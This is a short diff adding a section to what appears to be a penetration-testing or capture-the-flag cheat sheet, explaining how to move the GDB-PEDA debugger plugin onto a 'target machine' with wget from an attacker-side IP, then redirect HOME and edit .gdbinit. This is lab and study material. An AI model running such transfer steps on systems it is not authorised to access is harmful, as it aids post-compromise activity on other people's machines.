@@ -241,6 +241,24 @@ while True:
 
 ![image](https://user-images.githubusercontent.com/123066149/228951637-17575ac8-fadd-452c-85f2-dba0fdf82327.png)
 
+# ${{\color{green}Ad GDB_PEDA to target machine }}\ $
+
+``tar -xvf peda.tar /dir/``
+
+``wget http://10.10.14.3:80/peda.tar ``
+
+``tar -xf peda.tar``
+
+``rm peda.tar``
+
+``echo $HOME``
+
+``export HOME=/tmp``
+
+``cd /``
+
+``echo "source ~/peda/peda.py" >> ~/.gdbinit``
+
 
 # ${{\color{purple}Script}}\ $
 # ${{\color{green}LinPeas}}\ $
